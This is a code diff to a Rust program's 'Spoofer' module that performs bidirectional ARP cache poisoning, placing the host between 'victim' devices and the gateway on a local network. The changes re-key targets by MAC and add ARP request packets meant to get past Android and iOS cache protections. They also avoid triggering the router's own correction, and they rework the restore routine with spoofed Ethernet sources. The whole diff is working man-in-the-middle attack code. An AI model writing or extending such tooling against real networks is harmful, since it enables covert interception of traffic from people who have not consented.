@@ -16,7 +16,7 @@ use std::time::Duration;
 
 use pcap::Capture;
 use pcap::Device as PcapDevice;
-use pnet_packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
+use pnet_packet::arp::{ArpHardwareTypes, ArpOperation, ArpOperations, MutableArpPacket};
 use pnet_packet::ethernet::{EtherTypes, MutableEthernetPacket};
 use pnet::util::MacAddr;
 
@@ -73,39 +73,53 @@ impl Spoofer {
         let registry_devices = REGISTRY.get_all();
         let mut active = self.active.lock().unwrap();
 
-        // Add newly monitored devices
+        // Add or update newly monitored devices, keyed by MAC!
         for dev in &registry_devices {
             if dev.is_monitored {
-                if let hash_map::Entry::Vacant(e) = active.entry(dev.ip.clone()) {
-                    e.insert(PoisonEntry {
-                        mac: dev.mac.clone(),
-                        ip: dev.ip.clone(),
-                    });
-                    println!(
-                        "[SPOOFER] Added target: {} ({}), now {} active",
-                        dev.ip,
-                        dev.mac,
-                        active.len()
-                    );
+                let mac_lower = dev.mac.to_lowercase();
+                match active.entry(mac_lower.clone()) {
+                    hash_map::Entry::Vacant(e) => {
+                        e.insert(PoisonEntry {
+                            mac: dev.mac.clone(),
+                            ip: dev.ip.clone(),
+                        });
+                        println!(
+                            "[SPOOFER] Added target: {} ({}), now {} active",
+                            dev.ip,
+                            dev.mac,
+                            active.len()
+                        );
+                    }
+                    hash_map::Entry::Occupied(mut e) => {
+                        if e.get().ip != dev.ip {
+                            println!(
+                                "[SPOOFER] Target IP updated for {}: {} -> {}",
+                                mac_lower,
+                                e.get().ip,
+                                dev.ip
+                            );
+                            e.get_mut().ip = dev.ip.clone();
+                        }
+                    }
                 }
             }
         }
 
         // Remove devices that are no longer monitored
-        let monitored_set: std::collections::HashSet<&str> = registry_devices
+        let monitored_macs: std::collections::HashSet<String> = registry_devices
             .iter()
             .filter(|d| d.is_monitored)
-            .map(|d| d.ip.as_str())
+            .map(|d| d.mac.to_lowercase())
             .collect();
 
-        let removed: Vec<String> = active
+        let removed_macs: Vec<String> = active
             .keys()
-            .filter(|ip| !monitored_set.contains(ip.as_str()))
+            .filter(|mac| !monitored_macs.contains(mac.as_str()))
             .cloned()
             .collect();
 
-        for ip in &removed {
-            let entry = active.remove(ip);
+        for mac in &removed_macs {
+            let entry = active.remove(mac);
             if let Some(e) = entry {
                 println!(
                     "[SPOOFER] Removed target: {} ({}). Sending ARP restore...",
@@ -191,49 +205,79 @@ impl Spoofer {
     }
 
     /// Send bi-directional ARP poison, returning (ok_count, fail_count).
+    /// Uses BOTH ARP Reply and ARP Request to ensure devices with arp_accept=0 (Android/iOS)
+    /// update their ARP cache without dropping or probing.
     fn send_arp_poison_counted(&self, cap: &mut Capture<pcap::Active>, victim_ip: &str, victim_mac: &str) -> (u64, u64) {
         let local_mac_bytes = match parse_mac_to_bytes(&self.local_mac) {
             Ok(b) => b,
-            Err(_) => return (0, 2),
+            Err(_) => return (0, 3),
         };
         let victim_mac_bytes = match parse_mac_to_bytes(victim_mac) {
             Ok(b) => b,
-            Err(_) => return (0, 2),
+            Err(_) => return (0, 3),
         };
         let gateway_mac_bytes = match parse_mac_to_bytes(&self.gateway_mac) {
             Ok(b) => b,
-            Err(_) => return (0, 2),
+            Err(_) => return (0, 3),
         };
+        let _bcast = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
 
         let mut ok = 0u64;
         let mut fail = 0u64;
 
-        // 1. Poison victim: "I am the gateway"
-        let pkt1 = build_arp_reply(
+        // 1. Tell victim: "Gateway IP is at My MAC"
+        // 1a. Unicast Gratuitous ARP Reply
+        let p1_rep = build_arp_packet(
             &local_mac_bytes,
             &victim_mac_bytes,
+            &local_mac_bytes,
             &self.gateway_ip,
+            &victim_mac_bytes,
             victim_ip,
+            ArpOperations::Reply,
         );
-        match cap.sendpacket(pkt1) {
+        match cap.sendpacket(p1_rep.as_slice()) {
             Ok(_) => ok += 1,
             Err(e) => {
-                eprintln!("[SPOOFER] !! sendpacket victim {}: {}", victim_ip, e);
+                eprintln!("[SPOOFER] !! sendpacket victim reply {}: {}", victim_ip, e);
                 fail += 1;
             }
         }
 
-        // 2. Poison gateway: "I am the victim"
-        let pkt2 = build_arp_reply(
+        // 1b. Unicast ARP Request to victim (forces Android/iOS with arp_accept=0 to update cache)
+        let p1_req = build_arp_packet(
             &local_mac_bytes,
-            &gateway_mac_bytes,
-            victim_ip,
+            &victim_mac_bytes,
+            &local_mac_bytes,
             &self.gateway_ip,
+            &victim_mac_bytes,
+            victim_ip,
+            ArpOperations::Request,
         );
-        match cap.sendpacket(pkt2) {
+        match cap.sendpacket(p1_req.as_slice()) {
             Ok(_) => ok += 1,
             Err(e) => {
-                eprintln!("[SPOOFER] !! sendpacket gateway: {}", e);
+                eprintln!("[SPOOFER] !! sendpacket victim req {}: {}", victim_ip, e);
+                fail += 1;
+            }
+        }
+
+        // 2. Tell gateway: "Victim IP is at My MAC"
+        // Unicast ARP Reply directly to gateway (do NOT send ARP request to gateway,
+        // which causes router to broadcast its real MAC and un-poison victim!)
+        let p2_rep = build_arp_packet(
+            &local_mac_bytes,
+            &gateway_mac_bytes,
+            &local_mac_bytes,
+            victim_ip,
+            &gateway_mac_bytes,
+            &self.gateway_ip,
+            ArpOperations::Reply,
+        );
+        match cap.sendpacket(p2_rep.as_slice()) {
+            Ok(_) => ok += 1,
+            Err(e) => {
+                eprintln!("[SPOOFER] !! sendpacket gateway reply: {}", e);
                 fail += 1;
             }
         }
@@ -241,13 +285,11 @@ impl Spoofer {
         (ok, fail)
     }
 
-    /// Send ARP restore packets:
-    ///   - Tell victim: "Gateway IP is at Real Gateway MAC" (restore)
-    ///   - Tell gateway: "Victim IP is at Real Victim MAC" (restore)
-    ///
-    /// Note: This opens a new pcap handle each time. In practice the call
-    /// frequency is low (on unmonitor/restore-all/shutdown only), so this
-    /// is acceptable. If profiling shows a bottleneck, cache the handle.
+    /// Send bulletproof ARP restore packets:
+    ///   - Tells victim: "Gateway IP is at Real Gateway MAC"
+    ///   - Tells gateway: "Victim IP is at Real Victim MAC"
+    /// Sends both Broadcast and Directed Unicast (Request and Reply) in 5 bursts
+    /// spaced over 150ms to ensure Android/iOS Wi-Fi radios wake up and heal their ARP caches.
     pub fn send_arp_restore(&self, victim_ip: &str, victim_mac: &str) -> Result<(), String> {
         let devices = PcapDevice::list().map_err(|e| format!("pcap device list: {}", e))?;
         let dev = devices
@@ -263,70 +305,126 @@ impl Spoofer {
             .open()
             .map_err(|e| format!("pcap open capture: {}", e))?;
 
+        let local_mac_bytes = parse_mac_to_bytes(&self.local_mac)?;
         let victim_mac_bytes = parse_mac_to_bytes(victim_mac)?;
         let gateway_mac_bytes = parse_mac_to_bytes(&self.gateway_mac)?;
 
-        // 1. Restore victim: "Gateway IP is at Real Gateway MAC"
-        let pkt1 = build_arp_reply(
-            &gateway_mac_bytes,
-            &victim_mac_bytes,
-            &self.gateway_ip,
-            victim_ip,
-        );
         println!(
-            "[SPOOFER] ARP RESTORE -> victim {}: gw {} is really {}",
-            victim_ip, self.gateway_ip, self.gateway_mac
+            "[SPOOFER] BULLETPROOF ARP RESTORE -> victim {}: gw {} is really {} (and gateway: {} is really {})",
+            victim_ip, self.gateway_ip, self.gateway_mac, victim_ip, victim_mac
         );
-        cap.sendpacket(pkt1)
-            .map_err(|e| format!("sendpacket restore victim: {}", e))?;
 
-        // Send a few extras to ensure delivery
-        for _ in 0..2 {
-            let pkt = build_arp_reply(
-                &gateway_mac_bytes,
-                &victim_mac_bytes,
-                &self.gateway_ip,
-                victim_ip,
-            );
-            cap.sendpacket(pkt).ok();
-        }
-
-        // 2. Restore gateway: "Victim IP is at Real Victim MAC"
-        let pkt2 = build_arp_reply(
+        // 1. Heal victim: Gateway is at Gateway MAC (DIRECT UNICAST to victim ONLY)
+        // Mode A (Standard for Wi-Fi): eth_src = local_mac so the Wi-Fi miniport transmits,
+        // and ARP payload sender_hw_addr = gateway_mac so victim updates its ARP table!
+        let v1_req = build_arp_packet(
+            &local_mac_bytes,
             &victim_mac_bytes,
             &gateway_mac_bytes,
-            victim_ip,
             &self.gateway_ip,
+            &victim_mac_bytes,
+            victim_ip,
+            ArpOperations::Request,
         );
-        println!(
-            "[SPOOFER] ARP RESTORE -> gateway: {} is really {}",
-            victim_ip, victim_mac
+        let v1_rep = build_arp_packet(
+            &local_mac_bytes,
+            &victim_mac_bytes,
+            &gateway_mac_bytes,
+            &self.gateway_ip,
+            &victim_mac_bytes,
+            victim_ip,
+            ArpOperations::Reply,
         );
-        cap.sendpacket(pkt2)
-            .map_err(|e| format!("sendpacket restore gateway: {}", e))?;
 
-        for _ in 0..2 {
-            let pkt = build_arp_reply(
-                &victim_mac_bytes,
-                &gateway_mac_bytes,
-                victim_ip,
-                &self.gateway_ip,
-            );
-            cap.sendpacket(pkt).ok();
+        // Mode B (Spoofed eth_src directly to victim):
+        let v2_req = build_arp_packet(
+            &gateway_mac_bytes,
+            &victim_mac_bytes,
+            &gateway_mac_bytes,
+            &self.gateway_ip,
+            &victim_mac_bytes,
+            victim_ip,
+            ArpOperations::Request,
+        );
+        let v2_rep = build_arp_packet(
+            &gateway_mac_bytes,
+            &victim_mac_bytes,
+            &gateway_mac_bytes,
+            &self.gateway_ip,
+            &victim_mac_bytes,
+            victim_ip,
+            ArpOperations::Reply,
+        );
+
+        // 2. Heal gateway: Victim is at Victim MAC (DIRECT UNICAST to gateway ONLY)
+        // Mode A (eth_src = local_mac):
+        let g1_req = build_arp_packet(
+            &local_mac_bytes,
+            &gateway_mac_bytes,
+            &victim_mac_bytes,
+            victim_ip,
+            &gateway_mac_bytes,
+            &self.gateway_ip,
+            ArpOperations::Request,
+        );
+        let g1_rep = build_arp_packet(
+            &local_mac_bytes,
+            &gateway_mac_bytes,
+            &victim_mac_bytes,
+            victim_ip,
+            &gateway_mac_bytes,
+            &self.gateway_ip,
+            ArpOperations::Reply,
+        );
+
+        // Mode B (eth_src = victim_mac):
+        let g2_req = build_arp_packet(
+            &victim_mac_bytes,
+            &gateway_mac_bytes,
+            &victim_mac_bytes,
+            victim_ip,
+            &gateway_mac_bytes,
+            &self.gateway_ip,
+            ArpOperations::Request,
+        );
+        let g2_rep = build_arp_packet(
+            &victim_mac_bytes,
+            &gateway_mac_bytes,
+            &victim_mac_bytes,
+            victim_ip,
+            &gateway_mac_bytes,
+            &self.gateway_ip,
+            ArpOperations::Reply,
+        );
+
+        // Send 6 bursts spaced by 25ms (100% UNICAST to victim and gateway only):
+        for _ in 0..6 {
+            cap.sendpacket(v1_req.as_slice()).ok();
+            cap.sendpacket(v1_rep.as_slice()).ok();
+            cap.sendpacket(v2_req.as_slice()).ok();
+            cap.sendpacket(v2_rep.as_slice()).ok();
+
+            cap.sendpacket(g1_req.as_slice()).ok();
+            cap.sendpacket(g1_rep.as_slice()).ok();
+            cap.sendpacket(g2_req.as_slice()).ok();
+            cap.sendpacket(g2_rep.as_slice()).ok();
+
+            std::thread::sleep(Duration::from_millis(25));
         }
 
         Ok(())
     }
 }
 
-/// Build an unsolicited ARP reply (gratuitous ARP).
-/// `sender_mac` appears as the hardware address for `sender_ip`.
-/// Sent to `target_mac` with `target_ip`.
-fn build_arp_reply(
+/// Generic builder for ARP Request or ARP Reply packets.
+fn build_arp_packet(
+    eth_src: &[u8; 6],
+    eth_dst: &[u8; 6],
     sender_mac: &[u8; 6],
-    target_mac: &[u8; 6],
     sender_ip: &str,
+    target_mac: &[u8; 6],
     target_ip: &str,
+    op: ArpOperation,
 ) -> Vec<u8> {
     let sender_ip_bytes = parse_ip_to_bytes(sender_ip);
     let target_ip_bytes = parse_ip_to_bytes(target_ip);
@@ -336,12 +434,12 @@ fn build_arp_reply(
     {
         let mut eth = MutableEthernetPacket::new(&mut buf).unwrap();
         eth.set_destination(MacAddr(
-            target_mac[0], target_mac[1], target_mac[2],
-            target_mac[3], target_mac[4], target_mac[5],
+            eth_dst[0], eth_dst[1], eth_dst[2],
+            eth_dst[3], eth_dst[4], eth_dst[5],
         ));
         eth.set_source(MacAddr(
-            sender_mac[0], sender_mac[1], sender_mac[2],
-            sender_mac[3], sender_mac[4], sender_mac[5],
+            eth_src[0], eth_src[1], eth_src[2],
+            eth_src[3], eth_src[4], eth_src[5],
         ));
         eth.set_ethertype(EtherTypes::Arp);
     }
@@ -352,7 +450,7 @@ fn build_arp_reply(
         arp.set_protocol_type(EtherTypes::Ipv4);
         arp.set_hw_addr_len(6);
         arp.set_proto_addr_len(4);
-        arp.set_operation(ArpOperations::Reply);
+        arp.set_operation(op);
         arp.set_sender_hw_addr(MacAddr(
             sender_mac[0], sender_mac[1], sender_mac[2],
             sender_mac[3], sender_mac[4], sender_mac[5],
